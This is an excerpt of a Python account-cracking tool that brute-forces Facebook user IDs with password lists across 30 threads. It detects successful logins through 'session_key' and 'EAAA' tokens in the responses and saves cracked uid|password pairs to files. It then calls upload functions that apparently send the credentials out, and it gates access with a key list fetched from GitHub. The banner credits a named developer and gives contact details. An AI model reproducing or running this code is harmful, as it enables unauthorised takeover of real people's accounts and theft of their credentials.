...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/mehu5005/7R/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
 ...
 ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░  
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :  𝐌𝐎𝐇𝐀𝐌𝐌𝐀𝐃 𝐀𝐃𝐈 
     \033[1;91m➣ \033[1;92mFACEBOOK   :  𝐀𝐃𝐈 
     \033[1;93m➣ \033[1;92mWHATSAPP   :  01581491901
     \033[1;96m➣ \033[1;92mGITHUB     :  ADI_364
     \033[1;95m➣ \033[1;92mTOOLS      :  OLD ID CLON
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
    """)
		...
		print("\n\x1b[1;93m••••••••••••••••••••••••••••••••••••••••••••••••••••••••  ")
		print("\n%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 %s\033[1;95m(FREE)"%(G,R,G,Y,W))
...
#				exit()
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(mehuadi))
	...
	def old4_7(self):
		...
		try:
			...
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR mehu  "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:mehu ): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[>_] [mehu] : \033[0;97m %s/%s -> \033[0;92m [mehu -OK:%s ]- \033[0;93m[mehu-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
    ...
    'viewport-width': '980',
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[mehu-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [mehu-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[mehu-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [mehu-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
